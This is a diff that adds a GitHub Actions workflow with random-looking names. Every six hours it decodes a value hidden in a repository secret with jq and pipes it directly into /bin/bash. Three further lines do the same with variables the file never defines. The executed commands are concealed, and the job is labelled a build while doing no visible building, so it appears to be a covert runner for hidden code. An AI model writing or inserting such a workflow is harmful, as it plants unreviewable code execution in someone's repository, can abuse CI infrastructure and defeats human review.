@@ -1,0 +1,20 @@
+name: changtaizhu1234
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '26 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: changtaizhu1234
+        env:
+          m77856: ${{ secrets.m77856 }}
+        run: |
+          echo $m77856 | jq -r .a92896 | /bin/bash
+          echo $tsiq3 | jq -r .daeqg49574 | /bin/bash
+          echo $yvafg194 | jq -r .e387 | /bin/bash
+          echo $wulw82626 | jq -r .j46 | /bin/bash
+
